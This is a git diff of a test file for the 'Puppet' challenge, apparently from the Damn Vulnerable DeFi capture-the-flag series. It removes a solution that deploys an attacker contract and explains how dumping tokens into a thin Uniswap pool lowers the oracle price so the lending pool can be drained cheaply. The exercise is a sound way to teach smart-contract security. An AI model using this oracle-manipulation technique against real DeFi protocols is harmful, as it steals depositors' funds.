@@ -95,33 +95,6 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const attacker = await (await ethers.getContractFactory('PuppetPoolAttacker', deployer)).deploy(
-            token.address,
-            uniswapExchange.address,
-            lendingPool.address,
-            player.address,
-            { value: ethers.utils.parseEther("20") }
-        );
-
-        await token.connect(player).transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
-        await attacker.attack();
-
-        /*
-        Explanation:
-        The Uniswap pool has extremely low liquidity, having a pair with 10 ETH and 10 DVT.
-        We have 1000 DVT.
-        We create an attacker contract that dumps our 1000 DVT into the pool, swapping for ETH.
-        Then we borrow a lot of DVT with our ETH, because the price is low.
-        Then we send to the player.
-
-        Notes:
-        I again lost a lot of time because I forgot receive() external payable {} in my attacker contract
-        and error messages in Ethers are terrible. I should start writing receive() external payable {}
-        every time just to be sure.
-        Also the requirement of 1 transaction is misleading because that`s impossible, we did a total
-        of 3 transactions with 2 of them being from the deployer, which doesn`t make much sense,
-        just to pass the requirement.
-        */
     });
 
     after(async function () {
